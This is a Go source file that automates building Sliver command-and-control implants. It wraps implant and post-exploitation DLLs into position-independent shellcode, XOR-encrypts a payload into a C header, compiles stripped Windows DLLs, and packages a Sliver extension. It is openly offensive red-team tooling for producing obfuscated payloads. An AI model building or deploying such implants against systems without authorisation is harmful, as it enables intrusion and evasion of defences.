// Package crystal wraps the Crystal Palace build pipeline.
// It replaces every bash/Python script from CrystalSliver with Go functions.
package crystal

import (
	"archive/tar"
	"bufio"
	"compress/gzip"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// Config holds Crystal Palace environment variables.
type Config struct {
	CrystalPalaceHome string // dir containing the Crystal Palace `link` binary
	SliverServer      string // sliver-server binary path (only for --profile mode)
	RepoRoot          string // crystalkit repo root
}

// LoadEnv reads KEY=VALUE pairs from an env file (like .crystalenv) and
// falls back to OS environment variables.
func LoadEnv(path string) (*Config, error) {
	kv := map[string]string{}

	f, err := os.Open(path)
	if err == nil {
		defer f.Close()
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			k, v, found := strings.Cut(line, "=")
			if !found {
				continue
			}
			kv[strings.TrimSpace(k)] = strings.TrimSpace(v)
		}
	} else if !os.IsNotExist(err) {
		return nil, fmt.Errorf("opening %s: %w", path, err)
	}

	get := func(key string) string {
		if v, ok := kv[key]; ok && v != "" {
			return v
		}
		return os.Getenv(key)
	}

	cfg := &Config{
		CrystalPalaceHome: get("CRYSTAL_PALACE_HOME"),
		SliverServer:      get("SLIVER_SERVER"),
	}
	if cfg.CrystalPalaceHome == "" {
		return nil, fmt.Errorf("CRYSTAL_PALACE_HOME is not set (check %s or environment)", path)
	}

	linkBin := filepath.Join(cfg.CrystalPalaceHome, "link")
	if _, err := os.Stat(linkBin); err != nil {
		return nil, fmt.Errorf("Crystal Palace 'link' not found at %s — check CRYSTAL_PALACE_HOME", linkBin)
	}

	repoRoot := get("CRYSTALKIT_ROOT")
	if repoRoot == "" {
		repoRoot, _ = findRepoRoot()
	}
	cfg.RepoRoot = repoRoot

	return cfg, nil
}

// ── Implant (initial access) ──────────────────────────────────────────────

// ImplantOptions controls implant PICO generation.
type ImplantOptions struct {
	DLLPath     string // pre-built Sliver DLL (mutually exclusive with ProfileName)
	ProfileName string // Sliver profile to generate from
	OutputDir   string
}

// BuildImplant wraps a Sliver DLL with Crystal Palace and returns the PICO path.
//
// Equivalent to generate-implant.sh:
//
//	make -C crystal-kit-sliver/loader all
//	cd crystal-kit-sliver/loader
//	$CRYSTAL_PALACE_HOME/link loader.spec <dll_abs> <output_abs>
func BuildImplant(cfg *Config, opts ImplantOptions) (string, error) {
	loaderDir := filepath.Join(cfg.RepoRoot, "crystal-kit-sliver", "loader")
	if err := verifyLoaderSources(loaderDir); err != nil {
		return "", err
	}
	if err := makeAll(loaderDir, cfg); err != nil {
		return "", fmt.Errorf("building loader objects: %w", err)
	}

	dllPath := opts.DLLPath
	if dllPath == "" {
		var err error
		if dllPath, err = generateSliverDLL(cfg, opts.ProfileName, opts.OutputDir); err != nil {
			return "", err
		}
	}

	absDLL, err := filepath.Abs(dllPath)
	if err != nil {
		return "", err
	}
	absOut, err := filepath.Abs(filepath.Join(opts.OutputDir, "implant.bin"))
	if err != nil {
		return "", err
	}

	if err := runLink(cfg, loaderDir, "loader.spec", absDLL, absOut, ""); err != nil {
		return "", fmt.Errorf("crystal palace link: %w", err)
	}
	return absOut, nil
}

// ── Post-ex ───────────────────────────────────────────────────────────────

// PostexOptions controls post-ex PICO generation.
type PostexOptions struct {
	DLLPath     string
	RuntimeArgs string // baked-in args (optional; can also pass at runtime with | separator)
	OutputDir   string
}

// BuildPostex wraps a post-ex DLL with Crystal Palace and returns the PICO path.
//
// Equivalent to generate.sh / postex.sh:
//
//	make -C crystal-kit-sliver/postex-loader all
//	cd crystal-kit-sliver/postex-loader
//	$CRYSTAL_PALACE_HOME/link loader.spec <dll_abs> <output_abs> %ARGFILE=<args_file>
func BuildPostex(cfg *Config, opts PostexOptions) (string, error) {
	loaderDir := filepath.Join(cfg.RepoRoot, "crystal-kit-sliver", "postex-loader")
	if err := verifyLoaderSources(loaderDir); err != nil {
		return "", err
	}
	if err := makeAll(loaderDir, cfg); err != nil {
		return "", fmt.Errorf("building postex-loader objects: %w", err)
	}

	base := strings.TrimSuffix(filepath.Base(opts.DLLPath), ".dll")
	absDLL, err := filepath.Abs(opts.DLLPath)
	if err != nil {
		return "", err
	}
	absOut, err := filepath.Abs(filepath.Join(opts.OutputDir, base+".pico.bin"))
	if err != nil {
		return "", err
	}

	argsFile := ""
	if opts.RuntimeArgs != "" {
		tf, err := os.CreateTemp("", "crystal-args-*")
		if err != nil {
			return "", fmt.Errorf("creating args temp file: %w", err)
		}
		defer os.Remove(tf.Name())
		if _, err := tf.WriteString(opts.RuntimeArgs); err != nil {
			return "", err
		}
		tf.Close()
		argsFile = tf.Name()
	}

	if err := runLink(cfg, loaderDir, "loader.spec", absDLL, absOut, argsFile); err != nil {
		return "", fmt.Errorf("crystal palace link: %w", err)
	}
	return absOut, nil
}

// ── crystal-exec extension build ──────────────────────────────────────────

// BuildCrystalExec runs the full 4-step crystal-exec build pipeline and
// returns the path to the output crystal-exec.x64.dll.
//
// Steps:
//  1. Compile c/crystal-exec/crystalexec.dll  (MinGW, CRT-free)
//  2. Wrap with Crystal Palace postex-loader  → crystalexec.pico.bin
//  3. XOR-encrypt PICO → C header             → crystalexec_pico.h
//  4. Compile c/crystal-exec/crystal-exec.x64.dll (embeds the PICO)
func BuildCrystalExec(cfg *Config, outputDir string) (string, error) {
	execSrcDir := filepath.Join(cfg.RepoRoot, "c", "crystal-exec")

	// Step 1: crystalexec.dll
	fmt.Println("[*] Step 1/4: compiling crystalexec.dll")
	if err := mingwBuild(execSrcDir, "crystalexec.c", "crystalexec.dll"); err != nil {
		return "", fmt.Errorf("step 1 (crystalexec.dll): %w", err)
	}

	// Step 2: Crystal Palace postex wrap → crystalexec.pico.bin
	fmt.Println("[*] Step 2/4: wrapping with Crystal Palace")
	postexLoader := filepath.Join(cfg.RepoRoot, "crystal-kit-sliver", "postex-loader")
	if err := verifyLoaderSources(postexLoader); err != nil {
		return "", err
	}
	if err := makeAll(postexLoader, cfg); err != nil {
		return "", fmt.Errorf("step 2 (postex-loader make): %w", err)
	}

	absDLL, err := filepath.Abs(filepath.Join(execSrcDir, "crystalexec.dll"))
	if err != nil {
		return "", err
	}
	picoBin := filepath.Join(execSrcDir, "crystalexec.pico.bin")
	absPico, err := filepath.Abs(picoBin)
	if err != nil {
		return "", err
	}

	// Empty args file: crystalexec accepts args at runtime via lpvReserved
	emptyArgs, err := os.CreateTemp("", "empty-args-*")
	if err != nil {
		return "", err
	}
	emptyArgs.Close()
	defer os.Remove(emptyArgs.Name())

	if err := runLink(cfg, postexLoader, "loader.spec", absDLL, absPico, emptyArgs.Name()); err != nil {
		return "", fmt.Errorf("step 2 (crystal palace link): %w", err)
	}

	// Step 3: XOR-encrypt PICO → C header
	fmt.Println("[*] Step 3/4: generating crystalexec_pico.h")
	headerPath := filepath.Join(execSrcDir, "crystalexec_pico.h")
	if err := GenPicoHeader(absPico, headerPath); err != nil {
		return "", fmt.Errorf("step 3 (gen pico header): %w", err)
	}

	// Step 4: crystal-exec.x64.dll
	fmt.Println("[*] Step 4/4: compiling crystal-exec.x64.dll")
	if err := mingwBuild(execSrcDir, "crystal-exec.c", "crystal-exec.x64.dll"); err != nil {
		return "", fmt.Errorf("step 4 (crystal-exec.x64.dll): %w", err)
	}

	// Copy output to outputDir
	src := filepath.Join(execSrcDir, "crystal-exec.x64.dll")
	dst := filepath.Join(outputDir, "crystal-exec.x64.dll")
	if err := copyFile(src, dst); err != nil {
		return "", fmt.Errorf("copying crystal-exec.x64.dll: %w", err)
	}
	return dst, nil
}

// BuildCrystalLoader compiles crystal-loader.x64.dll and copies it to outputDir.
func BuildCrystalLoader(cfg *Config, outputDir string) (string, error) {
	loaderSrcDir := filepath.Join(cfg.RepoRoot, "c", "crystal-loader")

	fmt.Println("[*] Compiling crystal-loader.x64.dll")
	cmd := exec.Command("make", "-C", loaderSrcDir)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("make crystal-loader: %w", err)
	}

	src := filepath.Join(loaderSrcDir, "crystal-loader.x64.dll")
	dst := filepath.Join(outputDir, "crystal-loader.x64.dll")
	if err := copyFile(src, dst); err != nil {
		return "", fmt.Errorf("copying crystal-loader.x64.dll: %w", err)
	}
	return dst, nil
}

// ── Extension tarball ─────────────────────────────────────────────────────

// PackExtension packages crystal-loader.x64.dll, crystal-exec.x64.dll, and
// extension.json into a Sliver-compatible tarball.
//
// Equivalent to pack-extension.sh.
func PackExtension(cfg *Config, outTarball string) (string, error) {
	if err := os.MkdirAll(filepath.Dir(outTarball), 0o755); err != nil {
		return "", err
	}

	manifestPath := filepath.Join(cfg.RepoRoot, "extension.json")
	loaderDLL    := filepath.Join(cfg.RepoRoot, "build", "crystal-loader.x64.dll")
	execDLL      := filepath.Join(cfg.RepoRoot, "build", "crystal-exec.x64.dll")

	required := map[string]string{
		"./extension.json":          manifestPath,
		"./crystal-loader.x64.dll":  loaderDLL,
		"./crystal-exec.x64.dll":    execDLL,
	}

	for archName, path := range required {
		if _, err := os.Stat(path); err != nil {
			return "", fmt.Errorf("missing: %s\n  → run 'crystalkit build-ext' first", archName)
		}
	}

	f, err := os.Create(outTarball)
	if err != nil {
		return "", err
	}
	defer f.Close()

	gz := gzip.NewWriter(f)
	defer gz.Close()
	tw := tar.NewWriter(gz)
	defer tw.Close()

	for archName, src := range required {
		if err := addToTar(tw, src, archName); err != nil {
			return "", fmt.Errorf("archiving %s: %w", archName, err)
		}
	}

	return outTarball, nil
}

// ── internal helpers ──────────────────────────────────────────────────────

// verifyLoaderSources checks that the CrystalSliver C sources are present.
func verifyLoaderSources(dir string) error {
	if _, err := os.Stat(dir); err != nil {
		return fmt.Errorf(
			"loader directory not found: %s\n"+
				"  → Clone CrystalSliver and symlink:\n"+
				"    git clone https://github.com/licitrasimone/CrystalSliver crystal-kit-sliver-src\n"+
				"    ln -s crystal-kit-sliver-src/crystal-kit-sliver crystal-kit-sliver",
			dir,
		)
	}
	return nil
}

// makeAll runs `make all` in dir with CRYSTAL_PALACE_HOME set.
func makeAll(dir string, cfg *Config) error {
	cmd := exec.Command("make", "-C", dir, "all")
	cmd.Env = append(os.Environ(), "CRYSTAL_PALACE_HOME="+cfg.CrystalPalaceHome)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("make in %s: %w", dir, err)
	}
	return nil
}

// mingwBuild compiles a single C file into a Windows DLL using MinGW.
func mingwBuild(dir, src, out string) error {
	cmd := exec.Command("x86_64-w64-mingw32-gcc",
		"-Wall", "-Os", "-DBUILD_DLL",
		"-ffunction-sections", "-fdata-sections",
		src, "-o", out,
		"-shared", "-Wl,--subsystem,windows", "-s", "-Wl,--gc-sections",
	)
	cmd.Dir = dir
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

// generateSliverDLL calls sliver-server to generate a shared DLL from a profile.
func generateSliverDLL(cfg *Config, profile, outDir string) (string, error) {
	if cfg.SliverServer == "" {
		return "", fmt.Errorf("SLIVER_SERVER not set; required for --profile mode")
	}
	outDLL := filepath.Join(outDir, "implant.dll")
	cmd := exec.Command(cfg.SliverServer,
		"generate", "--profile", profile,
		"--format", "shared", "--save", outDLL,
	)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("sliver-server generate: %w", err)
	}
	return outDLL, nil
}

// runLink invokes the Crystal Palace `link` binary from loaderDir.
//
// Invocation (verified from CrystalSliver generate-implant.sh / generate.sh):
//
//	cd <loaderDir>
//	$CRYSTAL_PALACE_HOME/link <specFile> <dllAbsPath> <outAbsPath> [%ARGFILE=<argsFile>]
func runLink(cfg *Config, loaderDir, specFile, dllPath, outBin, argsFile string) error {
	linkBin := filepath.Join(cfg.CrystalPalaceHome, "link")

	args := []string{specFile, dllPath, outBin}
	if argsFile != "" {
		args = append(args, fmt.Sprintf("%%ARGFILE=%s", argsFile))
	}

	cmd := exec.Command(linkBin, args...)
	cmd.Dir = loaderDir // spec references bin/*.o relative to this dir
	cmd.Env = append(os.Environ(), "CRYSTAL_PALACE_HOME="+cfg.CrystalPalaceHome)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func addToTar(tw *tar.Writer, src, archiveName string) error {
	fi, err := os.Stat(src)
	if err != nil {
		return err
	}
	hdr := &tar.Header{
		Name:    archiveName,
		Mode:    0o644,
		Size:    fi.Size(),
		ModTime: fi.ModTime(),
	}
	if err := tw.WriteHeader(hdr); err != nil {
		return err
	}
	f, err := os.Open(src)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = io.Copy(tw, f)
	return err
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

// findRepoRoot walks upward from CWD looking for go.mod.
func findRepoRoot() (string, error) {
	if root := os.Getenv("CRYSTALKIT_ROOT"); root != "" {
		return root, nil
	}
	dir, err := os.Getwd()
	if err != nil {
		return "", err
	}
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir, nil
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	return os.Getwd()
}
